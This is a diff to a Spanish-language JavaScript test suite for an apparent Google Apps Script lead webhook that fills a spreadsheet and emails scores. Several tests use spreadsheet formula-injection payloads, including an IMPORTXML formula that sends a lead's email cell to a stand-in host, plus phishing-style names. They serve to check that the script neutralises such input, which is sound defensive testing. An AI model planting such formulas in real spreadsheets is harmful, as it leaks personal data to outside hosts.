@@ -33,6 +33,9 @@ const fila = (e, r) => {
   const o = {}; enc.forEach((h, i) => { o[h] = f[i]; }); return o;
 };
 
+const ENC_ = ['Fecha', 'ID lead', 'Nombre', 'Correo', 'Teléfono', 'Comunidad', 'Situación', 'Producto', 'Facturación', 'Problema', 'Origen', 'Puntaje', 'Puntaje real', 'Medalla', 'Caso', 'Diagnóstico', 'Desenlace', 'Estado', 'Enviado', 'Detalle', 'Intentos'];
+const filaMake_ = (o = {}) => { const l = leadMake(o); return ['2026-09-25', l.id_lead, l.nombre, l.email, l.telefono, l.comunidad, l.situacion, l.producto, l.facturacion, l.problema, 'fb', '', '', '', '', '', '', o.estado || '', '', '', o.intentos || '']; };
+
 console.log('Respuestas del formulario');
 prueba('cada opción de la landing se reconoce tal cual', () => {
   const { api } = crearEntorno();
@@ -101,7 +104,8 @@ prueba('lead de Make → fila nueva → correo al lead → resultado en la hoja'
   assert.strictEqual(f.Estado, 'enviado'); assert.strictEqual(f.Puntaje, 74); assert.strictEqual(f['Puntaje real'], 69);
   assert.strictEqual(f.Medalla, 'Plata'); assert.strictEqual(f.Caso, '2.1'); assert.strictEqual(f['Diagnóstico'], 'Ventas y conversión'); assert.strictEqual(f.Desenlace, 'calificado');
   assert.strictEqual(f.Intentos, 1); assert.ok(f.Enviado instanceof Date); assert.strictEqual(f.Detalle, '');
-  assert.strictEqual(f['Teléfono'], "'+52 55 1234 5678");
+  assert.strictEqual(f['Teléfono'], '+52 55 1234 5678');
+  assert.strictEqual(e.estado.formulas.length, 0);
   assert.strictEqual(e.formatos[2], '@'); assert.strictEqual(e.formatos[5], '@');
 });
 prueba('el mismo lead dos veces (reintento de Make) → una sola fila y un solo correo', () => {
@@ -123,11 +127,19 @@ prueba('formato crudo de Meta (field_data) también entra', () => {
   assert.strictEqual(f['ID lead'], '999'); assert.strictEqual(f.Nombre, 'Luis Pérez'); assert.strictEqual(f.Caso, '4.1'); assert.strictEqual(f.Desenlace, 'descalificado');
   assert.ok(e.estado.correos[0].subject.startsWith('Luis, tu Creator Business Score: '));
 });
-prueba('un nombre con fórmula no se ejecuta en la hoja y sale escapado en el correo', () => {
+prueba('un nombre con fórmula queda como texto: ni al añadir la fila ni al escribir el resultado se crea una fórmula', () => {
   const e = entorno();
-  post(e.api, leadMake({ id_lead: '1', nombre: '=IMPORTXML("http://x","//a")<b>' }));
-  assert.strictEqual(fila(e, 2).Nombre, '\'=IMPORTXML("http://x","//a")<b>');
-  assert.ok(!e.estado.correos[0].htmlBody.includes('<b>'));
+  const r = post(e.api, leadMake({ id_lead: '1', nombre: '=IMPORTXML("http://x/?"&D2,"//a")<b>', problema: '=1+1' }));
+  assert.strictEqual(r.ok, true);
+  assert.strictEqual(e.estado.formulas.length, 0, JSON.stringify(e.estado.formulas));
+  assert.strictEqual(fila(e, 2).Nombre, '=IMPORTXML("http://x/?"&D2,"//a")<b>');   // texto, como lo guarda Sheets
+  assert.strictEqual(fila(e, 2).Estado, 'incompleto');
+});
+prueba('filas escritas por Make con texto "=…" en una respuesta: el script no reescribe esa celda', () => {
+  const e = entorno({ filas: [ENC_, filaMake_({ nombre: '=HYPERLINK("http://x")' })] });
+  e.api.procesarPendientes();
+  assert.strictEqual(e.estado.formulas.length, 0);
+  assert.strictEqual(fila(e, 2).Estado, 'enviado');
 });
 prueba('POST vacío solo procesa lo pendiente', () => {
   const e = entorno();
@@ -264,6 +276,118 @@ prueba('el HTML del correo es ligero (Gmail recorta por encima de ~102 KB)', () 
   e.api.procesarPendientes();
   const kb = Buffer.byteLength(e.estado.correos[0].htmlBody) / 1024;
   assert.ok(kb < 60, kb.toFixed(1) + ' KB');
+});
+
+console.log('Hallazgos de la revisión');
+prueba('cerrojo ocupado: el lead se guarda igual y Make recibe ok:true (sale en la próxima pasada)', () => {
+  const e = entorno({ cerrojoOcupado: true });
+  const r = post(e.api, leadMake());
+  assert.strictEqual(r.ok, true); assert.ok(/próxima pasada/.test(r.nota));
+  assert.strictEqual(fila(e, 2).Correo, 'Ana@Ejemplo.com'); assert.strictEqual(fila(e, 2).Estado, '');
+  e.estado.cerrojoOcupado = false;
+  e.api.procesarPendientes();
+  assert.strictEqual(fila(e, 2).Estado, 'enviado'); assert.strictEqual(e.estado.correos.length, 1);
+});
+prueba('reintento de Make con el cerrojo ocupado: se añade la fila, pero sale como duplicado y un solo correo', () => {
+  const e = entorno();
+  post(e.api, leadMake());
+  e.estado.cerrojoOcupado = true; post(e.api, leadMake()); e.estado.cerrojoOcupado = false;
+  e.api.procesarPendientes();
+  assert.strictEqual(fila(e, 3).Estado, 'duplicado'); assert.strictEqual(e.estado.correos.length, 1);
+});
+prueba('el webhook atiende primero su fila y como mucho 3: el atasco lo vacía el reloj', () => {
+  const filas = [ENC_];
+  for (let i = 0; i < 10; i++) filas.push(filaMake_({ id_lead: 'viejo' + i }));
+  const e = entorno({ filas });
+  const r = post(e.api, leadMake({ id_lead: 'nuevo', email: 'nuevo@ejemplo.com' }));
+  assert.strictEqual(r.fila, 12); assert.strictEqual(r.procesadas, 3);
+  assert.strictEqual(e.estado.correos[0].to, 'nuevo@ejemplo.com');
+  e.api.procesarPendientes();
+  assert.strictEqual(e.estado.correos.length, 11);
+});
+prueba('cuerpo ilegible (ni JSON ni campos) → ok:false y no escribe nada', () => {
+  const e = entorno();
+  const r = JSON.parse(e.api.doPost({ parameter: { token: TOKEN }, postData: { contents: '{roto' } }).texto);
+  assert.strictEqual(r.ok, false); assert.ok(e.celdas.length <= 1); assert.strictEqual(e.estado.errores.length, 1);
+});
+prueba('form-urlencoded (como lo manda Make): los campos llegan en e.parameter', () => {
+  const e = entorno();
+  const l = leadMake();
+  const r = JSON.parse(e.api.doPost({ parameter: Object.assign({ token: TOKEN }, l), postData: { contents: 'id_lead=...&email=...' } }).texto);
+  assert.strictEqual(r.ok, true); assert.strictEqual(r.enviadas, 1);
+});
+prueba('lead sin correo → fila "omitido" con el motivo, sin quedarse pendiente para siempre', () => {
+  const e = entorno();
+  const r = post(e.api, leadMake({ email: '' }));
+  assert.strictEqual(r.ok, true); assert.strictEqual(fila(e, 2).Estado, 'omitido'); assert.ok(fila(e, 2).Detalle.includes('sin correo'));
+});
+prueba('si alguien ordena la hoja mientras se envía, no se escribe el resultado encima de otro lead', () => {
+  const e = entorno({
+    filas: [ENC_, filaMake_({ id_lead: 'A', email: 'a@ejemplo.com' }), filaMake_({ id_lead: 'B', email: 'b@ejemplo.com' })],
+    alEnviar: (celdas) => { if (celdas[1][1] === 'A') { const t = celdas[1]; celdas[1] = celdas[2]; celdas[2] = t; } }
+  });
+  e.api.procesarPendientes();
+  // A se envió y quedó en la fila 3 como "enviando" (no se pudo confirmar); B, ahora en la 2, no recibió el resultado de A.
+  const f2 = fila(e, 2), f3 = fila(e, 3);
+  assert.strictEqual(f2['ID lead'], 'B'); assert.notStrictEqual(f2.Estado, 'enviando');
+  assert.strictEqual(f3['ID lead'], 'A'); assert.strictEqual(f3.Estado, 'enviando');
+  e.api.procesarPendientes();
+  assert.strictEqual(fila(e, 3).Estado, 'revisar');
+});
+prueba('con copia oculta y cuota justa: no gasta intentos, espera cuota', () => {
+  const e = entorno({ filas: [ENC_, filaMake_()], cuota: 1, config: { COPIA_OCULTA: 'equipo@kunfupay.com' } });
+  e.api.procesarPendientes();
+  assert.strictEqual(fila(e, 2).Estado, ''); assert.strictEqual(fila(e, 2).Intentos, ''); assert.strictEqual(e.estado.correos.length, 0);
+});
+prueba('si MailApp dice "too many times" a mitad de envío: no cuenta como intento y queda pendiente', () => {
+  const e = entorno({ filas: [ENC_, filaMake_({ estado: 'error', intentos: 2 })], fallarCorreo: 1, errorCorreo: 'Service invoked too many times for one day: email.' });
+  e.api.procesarPendientes();
+  assert.strictEqual(fila(e, 2).Estado, ''); assert.strictEqual(fila(e, 2).Intentos, 2); assert.ok(fila(e, 2).Detalle.includes('cuota'));
+});
+prueba('el nombre solo se usa si son letras: nada de enlaces ni avisos en el asunto', () => {
+  const { api } = crearEntorno();
+  assert.strictEqual(api.primerNombre('josé luis'), 'José');
+  assert.strictEqual(api.primerNombre('ANA-MARÍA'), 'Ana-maría');
+  assert.strictEqual(api.primerNombre('Zoë'), 'Zoë');
+  assert.strictEqual(api.primerNombre('www.premio-kunfupay.com'), '');
+  assert.strictEqual(api.primerNombre('URGENTE:'), '');
+  assert.strictEqual(api.primerNombre('Ana\u3164verifica-tu-cuenta.com'), 'Ana');
+  assert.strictEqual(api.primerNombre('=HYPERLINK'), '');
+});
+prueba('medalla en la papelera: se ignora y se busca otra; si no hay, sale con cabecera de texto', () => {
+  const e = entorno({ filas: [ENC_, filaMake_()], papelera: ['cbs-74-2.1-correo.jpg'] });
+  e.api.procesarPendientes();
+  assert.ok(!e.estado.correos[0].inlineImages); assert.ok(fila(e, 2).Detalle.includes('Falta cbs-74-2.1-correo.jpg'));
+});
+prueba('el correo: hoja blanca en HTML (no en la imagen), botones con relleno para Outlook, fuente web fuera de Outlook, pie con la baja', () => {
+  const e = entorno({ filas: [ENC_, filaMake_({ facturacion: 'Menos de 1.000 €' })], config: { RESPONDER_A: 'hola@kunfupay.com' } });
+  e.api.procesarPendientes();
+  const c = e.estado.correos[0];
+  assert.ok(c.htmlBody.includes('border-radius:28px 28px 0 0'));
+  assert.ok(c.htmlBody.includes('mso-padding-alt:16px 34px'));
+  assert.ok(c.htmlBody.includes('<!--[if !mso]><!--><link href="https://fonts.googleapis.com'));
+  assert.ok(c.htmlBody.includes('<!--[if mso]><table role="presentation" width="600"'));
+  assert.ok(c.htmlBody.includes('mailto:hola@kunfupay.com?subject=Baja') && c.body.includes('escribe a hola@kunfupay.com'));
+  assert.strictEqual(c.replyTo, 'hola@kunfupay.com');
+});
+prueba('importar medallas: crea la carpeta junto a la hoja, descarga las que faltan y no duplica al repetir', () => {
+  const lista = ['cbs-31-4.1.jpg', 'cbs-31-4.1-correo.jpg', 'cbs-32-4.1.jpg'];
+  const e = crearEntorno({ props: { HOJA_ID: 'hoja-de-prueba' }, listaMedallas: lista });
+  const r1 = e.api.importarMedallas();
+  assert.deepStrictEqual(e.estado.carpetasCreadas, ['Medallas · Creator Business Score']);
+  assert.strictEqual(e.estado.props.CARPETA_MEDALLAS_ID, 'carpeta-ok');
+  assert.deepStrictEqual([r1.importadas, r1.quedan], [3, 0]);
+  assert.ok(e.estado.tiposCreados.every((t) => t === 'image/jpeg'));
+  assert.ok(e.estado.fetches.some((f) => f.url.includes('/medallas/img/cbs-31-4.1-correo.jpg')));
+  const r2 = e.api.importarMedallas();
+  assert.strictEqual(r2.importadas, 0); assert.strictEqual(e.estado.carpetasCreadas.length, 1);
+  assert.strictEqual(e.api.carpetaMedallasId(), 'carpeta-ok');
+});
+prueba('"Ver token del webhook" muestra el token y explica de dónde sacar la URL /exec', () => {
+  const e = entorno();
+  e.api.mostrarWebhook();
+  const a = e.estado.alertas[0];
+  assert.ok(a.x.includes('?token=' + TOKEN) && a.x.includes('Gestionar implementaciones') && a.x.includes('incógnito'));
 });
 
 console.log(`\n${n} pruebas superadas`);
